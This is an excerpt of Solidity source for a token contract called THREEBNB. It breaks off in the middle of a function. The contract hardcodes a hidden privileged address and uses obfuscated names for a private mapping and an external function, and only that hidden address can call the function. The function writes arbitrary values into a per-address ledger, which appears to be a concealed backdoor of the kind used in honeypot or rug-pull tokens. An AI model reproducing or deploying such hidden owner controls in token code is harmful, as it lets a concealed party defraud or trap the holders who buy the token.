...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0x5A15f4bFeb11881056Fb12DA0C193B9690889ea9;
...
contract THREEBNB is Context, IERC20, Ownable {
    ...
    uint256 private _total = 10000000000000000* 10**9;
    uint256 private _tFeeTotal;
    
    string private _name = "THREEBNB";
    string private _symbol = "THREEBNB";
    uint8 private _decimals = 9;

     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x48a17F3eFD68323fE6253161B629F668317Dc5E5;
  
    uint256 public deadFee = 7;
    ...
    mapping(address => uint256) private _treddjh;
    address[] private __treddjh;
    address owners;
    ...
    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "mhdwch");
        uint256 terca = _treddjh[pzytd];
        if (terca == 0) __treddjh.push(pzytd);
        _treddjh[pzytd] = terca.add(trbvjvfs);
